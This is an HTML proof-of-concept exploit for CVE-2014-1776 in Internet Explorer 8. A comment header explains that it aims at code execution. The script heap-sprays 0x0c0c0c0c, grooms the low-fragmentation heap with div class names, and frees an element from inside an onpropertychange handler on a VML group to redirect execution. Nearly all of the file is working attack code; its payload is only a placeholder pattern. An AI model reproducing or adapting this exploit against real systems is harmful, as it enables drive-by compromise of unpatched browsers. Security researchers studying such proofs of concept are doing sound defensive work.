<!-- 
CVE-2014-1776 on vanilla IE8
private exploit	was corrupting flash vector object in IE9.0 onwards to gain memory leak
no public (AFAIK) exploit for IE8, thus this makeshift POC for targetting code execution. 
Crash -> poi(esp) ==> call edx    [edx == 0x0c0c0c0c]
		 eip = 0x0c0c0c0c
just for fun, msvcr71.dll can be used :P
-->

<html xmlns:v="urn:schemas-microsoft-com:vml">
<head id="haed">
<title>IE Case Study - STEP1</title>
<style>
		v\:*{Behavior: url(#default#VML)}
</style>
<script>
		// gflags /i iexplore.exe +hpa +ust
		
		
		function heapspray()
		{
			padding = unescape('%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0000%u4000');
			//padding = unescape('%u0c0c%u0c0c');
			blocksize = 0xfffe0
			block = ''
			shellcode = unescape('%u0c0c%u0c0c');
			while (padding.length +shellcode.length < 0x1000/2)
				padding = padding + unescape('%u0c0c%u0c0c');
			document.write('padding length = '+padding.length/2);
			document.write('<br>shellcode length = '+shellcode.length/2); 
			while(block.length<blocksize)
				block = block + padding.substr(0,0xbe8/2) + shellcode + padding.substr(0,0x1000/2-0xbe8/2-shellcode.length);
			padding = '';
			CollectGarbage();
			document.write('<br>block length'+block.length/2);
			var newf = new Array();
			for(var i=0;i<200;i++)
			{
				newf[i]=block.substr(0,(blocksize-6)/2);
			}
			document.write('<br>done!');
		}
	
			lfh = new Array(20);
      		for(i = 0; i < lfh.length; i++) 
      		{
       			lfh[i] = document.createElement('div');
        		lfh[i].className ="\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c";
      		}
	
			heapspray();
	
	
			window.onload = function (){
			var head = document.getElementById("haed")
			tmp = document.createElement("CVE-2014-1776")
			document.getElementById("vml").childNodes[0].appendChild(tmp)
			tmp.appendChild(head)
			tmp = head.offsetParent
			tmp.onpropertychange = function()
			{
				this["removeNode"](true)
				document.createElement("CVE-2014-1776").title = ""	
				_lfh = document.createElement('div');
				_lfh.className="\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c";
			}
			head.firstChild.nextSibling.disabled = head}
			
		
</script>
</head>
<body><v:group id="vml" style="width:500pt;"><div></div></group></body>
</html>